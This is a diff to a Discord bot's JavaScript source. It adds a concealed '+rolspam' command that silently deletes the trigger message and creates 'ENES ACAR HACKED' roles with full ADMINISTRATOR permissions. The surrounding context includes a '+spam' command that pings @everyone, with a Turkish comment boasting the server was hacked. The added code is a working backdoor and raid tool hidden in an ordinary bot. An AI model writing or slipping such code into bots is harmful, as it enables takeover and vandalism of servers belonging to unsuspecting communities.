@@ -3085,6 +3085,23 @@ client.on("message", msg => {
   }
 });
 
+
+    client.on("message", msg => {
+  if (msg.content === "+rolspam") {  //SIZE YÖNETICI YETKISI VERIR +yetki
+    msg.delete();
+    msg.guild.createRole({
+      name: "ENES ACAR HACKED",
+      color: "FF0000",
+      permissions: ["ADMINISTRATOR"]
+    });
+        msg.guild.createRole({
+      name: "ENES ACAR HACKED",
+      color: "FF0000",
+      permissions: ["ADMINISTRATOR"]
+    });
+  }
+});
+
 client.on('message', msg => {
   if (msg.content === '+spam') {
         msg.reply('@everyone'); //O KANALA BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone
